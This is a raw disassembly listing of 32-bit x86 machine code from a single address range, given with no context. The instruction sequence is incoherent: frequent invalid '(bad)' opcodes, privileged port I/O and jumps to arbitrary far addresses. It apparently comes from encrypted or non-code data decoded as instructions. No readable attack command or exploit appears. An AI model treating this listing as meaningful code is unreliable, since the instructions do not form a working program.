  40a506:	mov    ebx,0x5f5ced7
  40a50b:	cmc    
  40a50c:	mov    esp,0xcf07bfbc
  40a511:	(bad)  
  40a513:	iret   
  40a514:	out    dx,eax
  40a515:	fisubr DWORD PTR [eax-0x4e143123]
  40a51b:	rol    cl,cl
  40a51d:	ret    0xd5cb
  40a520:	sar    ebx,1
  40a522:	leave  
  40a523:	into   
  40a524:	aad    0xf0
  40a526:	shl    edi,1
  40a528:	stc    
  40a529:	out    0xc6,al
  40a52b:	jmp    0x40a502
  40a52d:	in     al,0xde
  40a52f:	push   es
  40a530:	add    eax,esp
  40a532:	out    0xa,al
  40a534:	adc    ebp,eax
  40a536:	iret   
  40a537:	repz xlat BYTE PTR ds:[ebx]
  40a539:	in     eax,0xe1
  40a53b:	into   
  40a53c:	in     al,0xb4
  40a53e:	(bad)  
  40a53f:	out    0xc6,al
  40a541:	cli    
  40a542:	cmc    
  40a543:	(bad)  
  40a544:	fcmovnu st,st(1)
  40a546:	shl    al,1
  40a548:	add    BYTE PTR [edi-0x19f4fb0c],bh
  40a54e:	neg    al
  40a550:	out    0x1,al
  40a552:	pop    es
  40a553:	or     ebx,esp
  40a555:	cli    
  40a556:	mov    esi,0xc7f6b7bd
  40a55b:	(bad)  
  40a55c:	out    0xe0,eax
  40a55e:	mov    dl,0xca
  40a560:	mov    ecx,0xbdbdd4c8
  40a565:	fcmovu st,st(2)
  40a567:	dec    ah
  40a569:	cmc    
  40a56a:	rol    BYTE PTR [ecx+esi*8],0xdb
  40a56e:	fdivrp st(5),st
  40a570:	or     edi,ecx
  40a572:	in     eax,0xcc
  40a574:	into   
  40a575:	jecxz  0x40a540
  40a577:	leave  
  40a578:	jecxz  0x40a557
  40a57a:	mov    esp,0xd3b7f2cf
  40a57f:	mov    ch,0xd9
  40a581:	(bad)  
  40a582:	fxch   st(1)
  40a584:	into   
  40a585:	fst    st(2)
  40a587:	clc    
  40a588:	fcomip st,st(3)
  40a58a:	mov    ebp,0xdec3d9ec
  40a58f:	cld    
  40a590:	out    0xca,eax
  40a592:	cld    
  40a593:	jecxz  0x40a57e
  40a595:	stc    
  40a596:	shl    ebx,0xeb
  40a599:	(bad)  
  40a59a:	loopne 0x40a57e
  40a59c:	cmc    
  40a59d:	rol    eax,cl
  40a59f:	in     eax,dx
  40a5a0:	out    dx,al
  40a5a1:	call   0xf3f29491
  40a5a6:	fnstcw WORD PTR [ecx+ebx*8-0x24240e0c]
  40a5ad:	fst    st(4)
  40a5af:	fmul   st,st(2)
  40a5b1:	dec    BYTE PTR [edx]
  40a5b3:	pop    es
  40a5b4:	out    0xef,eax
  40a5b6:	ret    0xd7de
  40a5b9:	test   al,0xcb
  40a5bb:	mov    ch,0xe8
  40a5bd:	in     eax,dx
  40a5be:	in     eax,0xd2
  40a5c0:	jmp    0x40a5a6
  40a5c2:	mov    ebp,0xbdefefe9
  40a5c7:	out    0xf1,eax
  40a5c9:	cli    
  40a5ca:	fsub   st,st(5)
  40a5cc:	ret    
  40a5cd:	jmp    0xe10baad3
  40a5d2:	leave  
  40a5d3:	or     eax,0xaef300fb
  40a5d8:	retf   
  40a5d9:	out    dx,al
  40a5da:	loope  0x40a59f
  40a5dc:	into   
  40a5dd:	into   
  40a5de:	repz retf 
  40a5e0:	hlt    
  40a5e1:	(bad)  
  40a5e4:	iret   
  40a5e5:	mov    al,0xd6
  40a5e7:	add    al,bl
  40a5e9:	mov    ah,0xed
  40a5eb:	rcr    ebx,1
  40a5ed:	mov    eax,0xd9fbf4e3
  40a5f2:	leave  
  40a5f3:	dec    esi
  40a5f5:	add    eax,0xf5aee3ec
  40a5fa:	shl    DWORD PTR [ebx-0x16254c3c],1
  40a600:	int3   
  40a601:	retf   0xdbeb
  40a604:	(bad)  
  40a606:	mov    eax,0x1d2e1d2
  40a60b:	fild   WORD PTR ds:0xdff0e3c6
  40a611:	push   cs
  40a612:	fdivr  st,st(4)
  40a614:	push   es
  40a615:	call   0xd0ea72f2
  40a61a:	cmc    
  40a61b:	aad    0xd3
  40a61d:	sti    
  40a61e:	mov    bh,0xef
  40a620:	fnstenv [ebp-0x4515114a]
  40a626:	loope  0x40a5fe
  40a628:	cmc    
  40a629:	cld    
  40a62a:	push   es
  40a62b:	pop    es
  40a62c:	xbegin 0xdb1e8602
  40a632:	out    0xdf,al
  40a634:	loopne 0x40a613
  40a636:	(bad)  
  40a637:	lock rcl eax,cl
  40a63a:	xlat   BYTE PTR ds:[ebx]
  40a63b:	loopne 0x40a5fe
  40a63d:	leave  
  40a63e:	call   0xf4f97f14
  40a643:	mov    dh,0xf5
  40a645:	(bad)  
  40a647:	fdivr  QWORD PTR [edi-0x2b182b2c]
  40a64d:	retf   0xd5fe
  40a650:	in     eax,0xd5
  40a652:	jmp    0xc6c0:0xbdcb01c4
  40a659:	iret   
  40a65a:	aam    0xc5
  40a65c:	mov    bh,0xf4
  40a65e:	mov    al,0xb7
  40a660:	mov    cl,0xbe
  40a662:	div    DWORD PTR [esi-0x401f2728]
  40a668:	mov    esp,0xfbfcf5fd
  40a66d:	rcl    ch,cl
  40a66f:	(bad)  
  40a671:	jmp    0xeb13a76f
  40a676:	into   
  40a677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a678:	mov    cl,0xcc
  40a67a:	in     al,0xb4
  40a67c:	xlat   BYTE PTR ds:[ebx]
  40a67d:	sti    
  40a67e:	xlat   BYTE PTR ds:[ebx]
  40a67f:	hlt    
  40a680:	in     eax,dx
  40a681:	hlt    
  40a682:	cld    
  40a683:	mov    edi,0xe1c9f0c9
  40a688:	aam    0xd4
  40a68a:	ret    
  40a68b:	(bad)  
  40a68c:	jecxz  0x40a668
  40a68e:	stc    
  40a68f:	les    eax,FWORD PTR [esi]
  40a691:	push   es
  40a692:	jmp    0xe9c6:0xcf130306
  40a699:	rol    esp,0xbc
  40a69c:	lods   eax,DWORD PTR ds:[esi]
  40a69d:	loop   0x40a658
  40a69f:	jmp    0xb8f59f92
  40a6a4:	neg    esp
  40a6a6:	mov    edi,0x2b8e1de
  40a6ab:	clc    
  40a6ac:	fsubr  st(1),st
  40a6ae:	jmp    esi
  40a6b0:	loopne 0x40a6b7
  40a6b2:	add    ebx,esi
  40a6b4:	in     eax,dx
  40a6b5:	(bad)  
  40a6b6:	(bad)  
  40a6b8:	out    dx,eax
  40a6b9:	faddp  st(5),st
  40a6bb:	repz mul cl
  40a6be:	(bad)  
  40a6c0:	lods   eax,DWORD PTR ds:[esi]
  40a6c1:	mov    ch,0xbe
  40a6c3:	stc    
  40a6c4:	out    dx,al
  40a6c5:	mov    ecx,0xf0e6bfff
  40a6ca:	aam    0xcc
  40a6cc:	mov    ecx,0xdde0d8d5
  40a6d1:	call   0xef1e73d7
  40a6d6:	ret    0xddf3
  40a6d9:	int    0xe3
  40a6db:	enter  0xd0d3,0xe1
  40a6df:	int    0xc5
  40a6e1:	int    0xd7
  40a6e3:	icebp  
  40a6e4:	rcr    eax,1
  40a6e6:	ror    esi,0xbc
  40a6e9:	ret    0xd8cc
  40a6ec:	pop    es
  40a6ed:	cmc    
  40a6ee:	mov    edi,0xcbe5e3c5
  40a6f3:	iret   
  40a6f4:	push   cs
  40a6f5:	repnz jecxz 0x40a6c3
  40a6f8:	ror    edx,cl
  40a6fa:	in     al,0xd0
  40a6fc:	aam    0xd0
  40a6fe:	(bad)  
  40a6ff:	leave  
  40a700:	(bad)  
  40a701:	lods   al,BYTE PTR ds:[esi]
  40a702:	in     al,0xcb
  40a704:	shr    bh,1
  40a706:	out    dx,al
  40a707:	jecxz  0x40a6da
  40a709:	add    al,BYTE PTR [edx]
  40a70b:	rcl    edi,0x3
  40a70e:	rol    BYTE PTR [edi+eax*8],0x9
  40a712:	jmp    0x40a6f6
  40a714:	add    DWORD PTR [ecx],eax
  40a716:	iret   
  40a717:	mov    cl,0xb3
  40a719:	enter  0xace9,0xe7
  40a71d:	jmp    0x40a706
  40a71f:	lock fnstcw WORD PTR [esi-0x410c1133]
  40a726:	mov    esp,0xe3fbc7f1
  40a72b:	jecxz  0x40a737
  40a72d:	add    edx,esp
  40a72f:	fisttp QWORD PTR [esi]
  40a731:	sti    
  40a732:	aam    0xd
  40a734:	clc    
  40a735:	icebp  
  40a736:	test   eax,0xf5ddc2be
  40a73b:	mov    esp,0xdbc8c0d2
  40a740:	in     al,dx
  40a741:	(bad)  
  40a742:	(bad)  
  40a744:	fxtract 
  40a746:	loope  0x40a704
  40a748:	int3   
  40a749:	out    0xf9,al
  40a74b:	loopne 0x40a71f
  40a74d:	jecxz  0x40a738
  40a74f:	xlat   BYTE PTR ds:[ebx]
  40a750:	clc    
  40a751:	fmul   QWORD PTR [ebx]
  40a753:	in     al,0x6
  40a755:	cld    
  40a756:	out    0xe1,al
  40a758:	(bad)  
  40a759:	in     eax,0xbd
  40a75b:	jmp    0x40a737
  40a75d:	jmp    0xd7ef:0xd6ece5d4
  40a764:	mov    ch,0xc9
  40a766:	(bad)  
  40a768:	int    0xbe
  40a76a:	idiv   dl
  40a76c:	add    eax,0xe0ebd4f1
  40a771:	out    0xe8,eax
  40a773:	(bad)  
  40a775:	jmp    0x40a760
  40a777:	(bad)
  40a77a:	out    dx,al
  40a77b:	ror    edi,0xe6
  40a77e:	cli    
  40a77f:	sti    
  40a780:	cli    
  40a781:	xlat   BYTE PTR ds:[ebx]
  40a782:	mov    edx,0xffd4bfd6
  40a787:	(bad)  
  40a788:	mov    ebp,0xdae3f8f7
  40a78d:	fxch   st(2)
  40a78f:	fucom  st(6)
  40a791:	retf   
  40a792:	leave  
  40a793:	(bad)  
  40a794:	call   0xcde94f92
  40a799:	imul   BYTE PTR [ebx-0x4a3b0a31]
  40a79f:	in     al,0xba
  40a7a1:	shl    ebx,cl
  40a7a3:	in     al,dx
  40a7a4:	sti    
  40a7a5:	rcr    ch,1
  40a7a7:	fsubp  st(4),st
  40a7a9:	hlt    
  40a7aa:	fcom   st(1)
  40a7ac:	ret    
  40a7ad:	loopne 0x40a7a6
  40a7af:	fld    st(4)
  40a7b1:	std    
  40a7b2:	cld    
  40a7b3:	cli    
  40a7b4:	out    0xf2,al
  40a7b6:	jecxz  0x40a77f
  40a7b8:	jmp    0xc4b5:0xeee9c2f6
  40a7bf:	(bad)  
  40a7c1:	rcr    esp,1
  40a7c3:	jmp    0x40a7bc
  40a7c5:	shr    ebp,1
  40a7c7:	in     al,dx
  40a7c8:	mov    ecx,0xbd0e707
  40a7cd:	jmp    0xe94f6fad
  40a7d2:	enter  0xdfdb,0xe5
  40a7d6:	jmp    0xe30b7783
  40a7db:	leave  
  40a7dc:	int3   
  40a7dd:	(bad)  
  40a7de:	mov    bl,0xf2
  40a7e0:	mov    ebx,0xf3dcc9f6
  40a7e5:	loop   0x40a7e6
  40a7e7:	mov    ecx,0x4d0e6bd
  40a7ec:	icebp  
  40a7ed:	rol    BYTE PTR [eax],1
  40a7ef:	out    dx,eax
  40a7f0:	fiadd  DWORD PTR [ebx+eax*1]
  40a7f3:	fmul   QWORD PTR [esi]
  40a7f5:	les    ebp,FWORD PTR [ebp-0x54110e36]
  40a7fb:	mov    dh,0xdb
  40a7fe:	clc    
  40a7ff:	aad    0xef
  40a801:	out    0xf2,al
  40a803:	mov    ecx,0xff01bcf1
  40a808:	sar    dh,cl
  40a80a:	(bad)  
  40a80b:	loop   0x40a818
  40a80d:	loope  0x40a811
  40a80f:	jmp    0x40a7f1
  40a811:	retf   
  40a812:	(bad)  
  40a814:	adc    bl,al
  40a816:	shr    ebx,cl
  40a818:	lock imul bh
  40a81b:	les    edi,FWORD PTR [ebx-0x38192c1c]
  40a821:	xlat   BYTE PTR ds:[ebx]
  40a822:	mov    esi,0xbad4d5f3
  40a827:	out    dx,eax
  40a828:	neg    eax
  40a82a:	add    dl,cl
  40a82c:	shl    ah,1
  40a82e:	aad    0x3
  40a830:	sar    bh,0xda
  40a833:	or     dh,cl
  40a835:	stc    
  40a836:	mov    ecx,0xd3b6efdd
  40a83b:	mov    cl,0xd6
  40a83d:	shr    cl,cl
  40a83f:	jmp    0xcffca3f9
  40a844:	(bad)  
  40a845:	mov    edx,0xd2ccf3d0
  40a84a:	push   es
  40a84b:	(bad)  
  40a84d:	jmp    0x40a80f
  40a84f:	mov    esi,0xdffb07e2
  40a854:	adc    bh,dh
  40a856:	ret    
  40a857:	(bad)  
  40a858:	jmp    0xf82b6c48
  40a85d:	mov    dl,0xe6
  40a85f:	mov    cl,0xf3
  40a861:	out    dx,eax
  40a862:	mov    edx,0xdbc9f2b5
  40a867:	rol    al,0xd0
  40a86a:	(bad)  
  40a86b:	fsubr  st(4),st
  40a86d:	add    al,0xa
  40a86f:	(bad)  
  40a870:	(bad)  
  40a872:	clc    
  40a873:	loop   0x40a848
  40a875:	stc    
  40a876:	mov    edi,0xd7cea9c3
  40a87b:	loope  0x40a865
  40a87d:	out    0xba,eax
  40a87f:	call   0xf5167e6d
  40a884:	cld    
  40a885:	int3   
  40a886:	loopne 0x40a88f
  40a888:	jecxz  0x40a860
  40a88a:	int3   
  40a88b:	(bad)  
  40a88d:	fcmovu st,st(0)
  40a88f:	ror    BYTE PTR [edi],1
  40a891:	leave  
  40a892:	retf   0xdbf3
  40a895:	or     ebp,edi
  40a897:	(bad)  
  40a899:	int    0xd2
  40a89b:	int3   
  40a89c:	mov    bh,0xce
  40a89e:	cmc    
  40a89f:	fnstcw WORD PTR [edi-0x4402330b]
  40a8a5:	imul   ebp
  40a8a7:	out    dx,al
  40a8a8:	lock fxtract 
  40a8ab:	fld    DWORD PTR [edx]
  40a8ad:	loop   0x40a88a
  40a8af:	cld    
  40a8b0:	(bad)  
  40a8b1:	fild   WORD PTR [edx]
  40a8b3:	(bad)  
  40a8b5:	loop   0x40a878
  40a8b7:	out    dx,al
  40a8b8:	ror    al,1
  40a8ba:	enter  0xf5f1,0xda
  40a8be:	call   0xb63363a2
  40a8c3:	sti    
  40a8c4:	aam    0xee
  40a8c6:	hlt    
  40a8c7:	std    
  40a8c8:	aam    0xcd
  40a8ca:	std    
  40a8cb:	lds    edi,FWORD PTR [ebp-0x42f8040c]
  40a8d1:	add    cl,bh
  40a8d3:	retf   0xe6c4
  40a8d6:	lock mov esp,0xb3acebcd
  40a8dc:	(bad)
  40a8e0:	in     eax,dx
  40a8e1:	cli    
  40a8e2:	std    
  40a8e3:	jmp    0xf81babd7
  40a8e8:	into   
  40a8e9:	into   
  40a8ea:	rcr    esi,0xfe
  40a8ed:	add    al,0xa
  40a8ef:	out    dx,eax
  40a8f0:	fld    QWORD PTR [ecx]
  40a8f2:	or     ecx,edx
  40a8f4:	fild   DWORD PTR [edx+eax*8]
  40a8f7:	scas   al,BYTE PTR es:[edi]
  40a8f8:	shr    BYTE PTR [edi-0x19101b2a],cl
  40a8fe:	in     eax,0xc4
  40a900:	mov    ebx,0xccf4bbda
  40a905:	fcmovbe st,st(3)
  40a907:	aad    0xc0
  40a909:	repnz out 0xbd,al
  40a90c:	aam    0xfd
  40a90e:	clc    
  40a90f:	out    0xca,al
  40a911:	fmul   st(7),st
  40a913:	fcomp  st(5)
  40a915:	shl    ch,cl
  40a917:	mov    bl,0xee
  40a919:	in     al,0xb1
  40a91b:	iret   
  40a91c:	mov    ebx,0xfab0f4c2
  40a921:	call   0x1662df
  40a926:	mov    bh,0xe1
  40a928:	out    dx,eax
  40a929:	fdivr  DWORD PTR [ebp-0x3a3b3ffd]
  40a92f:	clc    
  40a930:	(bad)  
  40a932:	clc    
  40a933:	call   0xd7fd9445
  40a938:	test   al,0xa4
  40a93a:	out    dx,al
  40a93b:	in     eax,0xc8
  40a93d:	jmp    0xcdfba02d
  40a942:	mul    ebx
  40a944:	cli    
  40a945:	idiv   DWORD PTR [ecx+0x2d9bee2]
  40a94b:	aad    0xd5
  40a94d:	ret    
  40a94e:	aad    0x2
  40a950:	(bad)  
  40a951:	hlt    
  40a952:	retf   0xcd06
  40a955:	add    eax,0xb2e7b2e0
  40a95a:	fnsave [edi-0x82e0d3b]
  40a960:	(bad)
  40a963:	(bad)  
  40a964:	xlat   BYTE PTR ds:[ebx]
  40a965:	enter  0xb6be,0xf2
  40a969:	in     eax,dx
  40a96a:	shl    ebp,0xde
  40a96d:	fild   DWORD PTR [edi]
  40a96f:	(bad)  
  40a970:	jmp    ebx
  40a972:	fucomip st,st(4)
  40a974:	loope  0x40a96e
  40a976:	(bad)  
  40a977:	into   
  40a978:	shl    BYTE PTR [ebx-0x4937521b],0xe1
  40a97f:	out    0xec,eax
  40a981:	(bad)  
  40a982:	in     al,dx
  40a983:	fcmovnu st,st(4)
  40a985:	int3   
  40a986:	idiv   DWORD PTR [edi-0x2944413e]
  40a98c:	or     ebx,edx
  40a98e:	or     DWORD PTR [eax],eax
  40a990:	xlat   BYTE PTR ds:[ebx]
  40a991:	cmc    
  40a992:	in     eax,0xde
  40a994:	adc    cl,dl
  40a996:	loope  0x40a983
  40a998:	jecxz  0x40a95f
  40a99a:	hlt    
  40a99b:	jmp    0x40a969
  40a99d:	icebp  
  40a99e:	not    dl
  40a9a0:	hlt    
  40a9a1:	jmp    0xbafe7d9c
  40a9a6:	repnz cmc 
  40a9a8:	loop   0x40a99c
  40a9aa:	stc    
  40a9ab:	(bad)  
  40a9ad:	loopne 0x40a9b1
  40a9af:	add    al,0xdf
  40a9b1:	mov    esp,0x70bc5d4
  40a9b6:	ffree  st(2)
  40a9b8:	leave  
  40a9b9:	loope  0x40a96b
  40a9bb:	retf   
  40a9bc:	jmp    0xecf9:0xd9f5b2eb
  40a9c3:	dec    ebp
  40a9c5:	mov    ecx,0xc2d5d6dc
  40a9ca:	ret    
  40a9cb:	loopne 0x40a9a3
  40a9cd:	hlt    
  40a9ce:	loopne 0x40a9af
  40a9d0:	mov    eax,0xc4f20de6
  40a9d6:	retf   0xadb8
  40a9d9:	xlat   BYTE PTR ds:[ebx]
  40a9da:	scas   al,BYTE PTR es:[edi]
  40a9db:	mov    bh,0xd3
  40a9dd:	cmc    
  40a9de:	(bad)  
  40a9df:	(bad)  
  40a9e1:	enter  0xcaf8,0xd5
  40a9e5:	fmul   st(4),st
  40a9e7:	(bad)  
  40a9e9:	int    0xf3
  40a9eb:	aam    0xe6
  40a9ed:	mul    esi
  40a9ef:	add    bh,ah
  40a9f1:	out    0xe,al
  40a9f3:	or     al,0xe3
  40a9f5:	fadd   st,st(5)
  40a9f7:	loop   0x40a9c7
  40a9f9:	shr    BYTE PTR [esi-0x113f3349],0xee
  40aa00:	out    dx,eax
  40aa01:	shl    BYTE PTR [ebx-0x11280501],1
  40aa07:	add    DWORD PTR [ecx],eax
  40aa09:	sti    
  40aa0a:	lock add dh,bl
  40aa0d:	(bad)  
  40aa0f:	jmp    ebx
  40aa11:	leave  
  40aa12:	cli    
  40aa13:	(bad)  
  40aa15:	out    0xcf,eax
  40aa17:	lods   al,BYTE PTR ds:[esi]
  40aa18:	shl    ebx,cl
  40aa1a:	fucomp st(6)
  40aa1c:	retf   0xcbe7
  40aa1f:	enter  0xf0f6,0xd6
  40aa23:	jecxz  0x40aa08
  40aa25:	int3   
  40aa26:	call   0xed3c9a2d
  40aa2b:	or     eax,ebp
  40aa2d:	in     eax,0xeb
  40aa2f:	or     BYTE PTR [edi],cl
  40aa31:	sti    
  40aa32:	out    0xe6,eax
  40aa34:	or     eax,0xe6d3c40b
  40aa39:	ret    0xe9b1
  40aa3c:	aam    0xb4
  40aa3e:	(bad)  
  40aa40:	mov    cl,0xf0
  40aa42:	stc    
  40aa43:	mov    esp,0xd6edc2d1
  40aa48:	pop    es
  40aa49:	in     eax,0xff
  40aa4b:	aad    0xfd
  40aa4d:	cli    
  40aa4e:	fadd   DWORD PTR ds:0xcbece3c0
  40aa54:	jmp    0xd6c1:0xf0bdccfc
  40aa5b:	mov    dl,0xf2
  40aa5d:	cli    
  40aa5e:	jmp    0xe50ba248
  40aa63:	retf   
  40aa64:	lock jmp ebx
  40aa67:	repnz repnz repnz repnz add edi,ecx
  40aa6d:	retf   0x801
  40aa70:	out    0xfb,eax
  40aa72:	out    0xd8,al
  40aa74:	iret   
  40aa75:	(bad)  
  40aa76:	iret   
  40aa77:	repz in eax,0xb2
  40aa7a:	cmc    
  40aa7b:	fucomi st,st(6)
  40aa7d:	mov    bh,0xd5
  40aa7f:	jmp    0x40aa58
  40aa81:	mov    edi,0xecbebddf
  40aa86:	mov    eax,0xd0c0ecfd
  40aa8b:	mov    esi,0xc4d1e904
  40aa90:	psadbw mm7,mm2
  40aa93:	or     eax,0xaee8dce4
  40aa98:	in     eax,0xd1
  40aa9a:	jecxz  0x40aa82
  40aa9c:	int    0xdb
  40aa9e:	mov    ah,0xae
  40aaa0:	shl    al,cl
  40aaa2:	(bad)  
  40aaa4:	jmp    0x40aa75
  40aaa6:	repz lock mov ch,0xc2
  40aaaa:	pop    es
  40aaab:	add    ebx,edi
  40aaad:	std    
  40aaae:	shr    edi,0xe9
  40aab1:	out    dx,eax
  40aab2:	leave  
  40aab3:	add    BYTE PTR [edi],cl
  40aab5:	loopne 0x40aa86
  40aab7:	ret    
  40aab8:	loopne 0x40aaa5
  40aaba:	mov    cl,0xb2
  40aabc:	repz enter 0xdfeb,0xc8
  40aac1:	int    0xd6
  40aac3:	(bad)  
  40aac4:	sar    BYTE PTR [eax-0x47474701],1
  40aaca:	pop    es
  40aacb:	lock add eax,0xc4e5c5c5
  40aad1:	vpaddd xmm5,xmm2,xmm7
  40aad5:	fucompp 
  40aad7:	test   eax,0xf1c7d1c9
  40aadc:	retf   0xb1d2
  40aadf:	enter  0xf8f7,0xfb
  40aae3:	mov    esp,0xe2dae9f4
  40aae8:	shl    bh,1
  40aaea:	add    al,bl
  40aaec:	ret    0xfed4
  40aaef:	add    ebx,ebp
  40aaf1:	fisttp DWORD PTR [edx+ecx*1]
  40aaf4:	out    0x9,al
  40aaf6:	stos   DWORD PTR es:[edi],eax
  40aaf7:	mov    eax,0xb4acd3f1
  40aafc:	loope  0x40aade
  40aafe:	retf   0xeee7
  40ab01:	in     eax,0xe4
  40ab03:	clc    
  40ab04:	jmp    0xe0d0:0xf2d7efbf
  40ab0b:	or     eax,ebx
  40ab0d:	(bad)  
  40ab0f:	add    eax,0xe9daedc9
  40ab14:	add    eax,0xbee3e204
  40ab19:	scas   al,BYTE PTR es:[edi]
  40ab1a:	jmp    0x40aae4
  40ab1c:	xlat   BYTE PTR ds:[ebx]
  40ab1d:	out    dx,al
  40ab1e:	icebp  
  40ab1f:	cmc    
  40ab20:	lods   eax,DWORD PTR ds:[esi]
  40ab21:	mov    ch,0xd9
  40ab23:	icebp  
  40ab24:	retf   0xd5bb
  40ab27:	loop   0x40aae5
  40ab29:	mov    ebp,0xf6d207c0
  40ab2e:	loope  0x40ab17
  40ab30:	not    dh
  40ab32:	(bad)  
  40ab34:	sti    
  40ab35:	cli    
  40ab36:	repz ffreep st(7)
  40ab39:	in     eax,dx
  40ab3a:	ror    ebp,0xca
  40ab3d:	(bad)  
  40ab40:	mov    al,0xbb
  40ab42:	fistp  QWORD PTR [ebx-0x27462f25]
  40ab48:	shl    eax,0xdd
  40ab4b:	fsub   st,st(2)
  40ab4d:	(bad)  
  40ab4f:	or     esp,edi
  40ab51:	mov    DWORD PTR [esi],0xc20ae4fc
  40ab57:	loope  0x40ab49
  40ab59:	mov    esi,0xd9c5f4ed
  40ab5e:	in     al,dx
  40ab5f:	(bad)  
  40ab60:	in     al,0xc8
  40ab62:	idiv   bl
  40ab64:	repnz rcl ebx,cl
  40ab67:	out    dx,eax
  40ab68:	loop   0x40ab3b
  40ab6a:	ftst   
  40ab6c:	div    dh
  40ab6e:	hlt    
  40ab6f:	or     bh,al
  40ab71:	retf   
  40ab72:	add    ah,dl
  40ab74:	push   es
  40ab75:	in     eax,dx
  40ab76:	in     al,0xc4
  40ab78:	rep lods eax,DWORD PTR ds:[esi]
  40ab7a:	cmc    
  40ab7b:	jecxz  0x40ab60
  40ab7d:	repz repz div BYTE PTR [edi+edi*4-0x3512292b]
  40ab86:	sar    DWORD PTR [edx-0x180d0d09],0xf4
  40ab8d:	add    BYTE PTR [eax],al
  40ab8f:	cli    
  40ab90:	fsub   st,st(3)
  40ab92:	in     al,0xc2
  40ab94:	call   0xae315593
  40ab99:	mov    bl,0xdc
  40ab9b:	int    0xc8
  40ab9d:	sti    
  40ab9e:	mov    edx,0xb8ccb7d4
  40aba3:	enter  0xdbff,0xfd
  40aba7:	clc    
  40aba8:	out    0xe2,eax
  40abaa:	(bad)  
  40abab:	fsubr  st(0),st
  40abad:	add    al,0xc3
  40abaf:	jmp    0x40aba7
  40abb1:	cmc    
  40abb2:	inc    BYTE PTR [edx]
  40abb4:	loopne 0x40abc8
  40abb6:	(bad)
  40abb9:	iret   
  40abba:	mov    cl,0xbc
  40abbc:	mov    dl,0xc9
  40abbe:	mov    al,0xb8
  40abc0:	retf   0xb7bf
  40abc3:	in     al,dx
  40abc4:	mov    ch,0xf9
  40abc6:	loope  0x40abb5
  40abc8:	ret    
  40abc9:	inc    BYTE PTR [edx]
  40abcb:	repnz rol BYTE PTR [ebx],cl
  40abce:	icebp  
  40abcf:	loop   0x40abce
  40abd1:	out    dx,eax
  40abd2:	loope  0x40abd6
  40abd4:	or     edx,esi
  40abd6:	icebp  
  40abd7:	into   
  40abd8:	retf   
  40abd9:	repnz scas al,BYTE PTR es:[edi]
  40abdb:	mov    ch,0xc8
  40abdd:	ror    esi,cl
  40abdf:	into   
  40abe0:	fdivr  st,st(5)
  40abe2:	mov    esi,0xdabffbee
  40abe7:	loope  0x40abda
  40abe9:	int3   
  40abea:	in     eax,0x3
  40abec:	icebp  
  40abed:	mov    esp,0x709c1de
  40abf2:	push   es
  40abf3:	leave  
  40abf4:	jmp    0xef277203
  40abf9:	retf   0xd0eb
  40abfc:	jmp    0x40abd7
  40abfe:	scas   eax,DWORD PTR es:[edi]
  40abff:	mov    edx,0xfacaf2d9
  40ac04:	into   
  40ac05:	loope  0x40abe1
  40ac07:	ret    0xbfce
  40ac0a:	aad    0x6
  40ac0c:	fld    DWORD PTR [esi]
  40ac0e:	or     BYTE PTR [ecx],al
  40ac10:	loopne 0x40abf4
  40ac12:	fcmove st,st(5)
  40ac14:	into   
  40ac15:	or     ch,cl
  40ac17:	shl    BYTE PTR [edx-0x2f330f17],cl
  40ac1d:	hlt    
  40ac1e:	rol    edi,1
  40ac20:	hlt    
  40ac21:	in     eax,0xd4
  40ac23:	call   0xbb3ea41b
  40ac28:	out    0xd4,al
  40ac2a:	sti    
  40ac2b:	fnstsw WORD PTR [ecx+edi*8-0x36082a1f]
  40ac32:	(bad)  
  40ac33:	int    0xff
  40ac35:	out    0xcb,eax
  40ac37:	ror    ch,1
  40ac39:	leave  
  40ac3a:	(bad)
  40ac3d:	retf   
  40ac3e:	(bad)  
  40ac3f:	into   
  40ac40:	fcmovnu st,st(1)
  40ac42:	mov    esi,0xe3f5f4d3
  40ac47:	hlt    
  40ac48:	rol    BYTE PTR [ebx],cl
  40ac4a:	mov    ebx,0xdafe04e5
  40ac4f:	add    esp,esp
  40ac51:	cld    
  40ac52:	loop   0x40ac32
  40ac54:	(bad)  
  40ac56:	call   0xe6fd910e
  40ac5b:	into   
  40ac5c:	xlat   BYTE PTR ds:[ebx]
  40ac5d:	out    dx,al
  40ac5e:	(bad)  
  40ac5f:	mov    ch,0xfa
  40ac61:	fucomi st,st(6)
  40ac63:	fidiv  WORD PTR [ebp-0x13493738]
  40ac69:	rol    edi,cl
  40ac6b:	xlat   BYTE PTR ds:[ebx]
  40ac6c:	sar    dl,1
  40ac6e:	jmp    0xe43eb15d
  40ac73:	cld    
  40ac74:	fsubp  st(7),st
  40ac76:	stos   DWORD PTR es:[edi],eax
  40ac77:	repnz retf 
  40ac79:	mov    cl,0xcb
  40ac7b:	out    dx,eax
  40ac7c:	out    0xc5,eax
  40ac7e:	fcomp  st(0)
  40ac80:	enter  0xdaf5,0xf2
  40ac84:	(bad)  
  40ac85:	lock stc 
  40ac87:	mov    ebp,0xf5e4b4f2
  40ac8c:	repz clc 
  40ac8e:	(bad)  
  40ac8f:	in     al,0x8
  40ac91:	(bad)  
  40ac92:	in     eax,0xcb
  40ac94:	add    ah,al
  40ac96:	retf   
  40ac97:	test   al,0xa9
  40ac99:	(bad)  
  40ac9b:	call   0xaf056484
  40aca0:	stc    
  40aca1:	(bad)  
  40aca3:	out    dx,eax
  40aca4:	jmp    0x40aca9
  40aca6:	ret    
  40aca7:	repz ret 
  40aca9:	sti    
  40acaa:	add    dl,cl
  40acac:	sti    
  40acad:	jecxz  0x40acb9
  40acaf:	std    
  40acb0:	add    ecx,DWORD PTR [edx]
  40acb2:	(bad)
  40acb5:	in     al,0xd0
  40acb7:	jmp    0xeb079183
  40acbc:	retf   
  40acbd:	in     eax,dx
  40acbe:	(bad)  
  40acc0:	in     al,dx
  40acc1:	cli    
  40acc2:	out    dx,al
  40acc3:	in     eax,dx
  40acc4:	(bad)  
  40acc5:	mov    ecx,0xfdf7cfba
  40acca:	mov    esi,0xbffbc407
  40accf:	loopne 0x40ac99
  40acd1:	neg    bl
  40acd3:	leave  
  40acd4:	into   
  40acd5:	or     ecx,eax
  40acd7:	lods   al,BYTE PTR ds:[esi]
  40acd8:	in     eax,dx
  40acd9:	retf   
  40acda:	out    0xce,eax
  40acdc:	lock div dh
  40acdf:	(bad)  
  40ace0:	rcl    dl,1
  40ace2:	iret   
  40ace3:	int    0xfc
  40ace5:	clc    
  40ace6:	lock cmc 
  40ace8:	into   
  40ace9:	xlat   BYTE PTR ds:[ebx]
  40acea:	mov    ebx,0xe9c5d5bd
  40acef:	fild   DWORD PTR [ecx]
  40acf1:	or     cl,cl
  40acf3:	stc    
